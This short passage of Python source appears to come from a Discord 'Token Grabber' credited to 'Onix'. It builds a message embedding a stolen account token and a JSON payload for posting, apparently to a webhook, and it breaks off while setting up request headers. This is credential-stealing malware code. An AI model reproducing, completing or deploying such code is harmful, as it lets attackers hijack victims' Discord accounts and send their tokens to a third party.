...
> :piñata: __Token__\n\t`{tok}`\n
*Made by Onix#0475* **|** ||https://github.com/0nixDev||\"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Onix', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
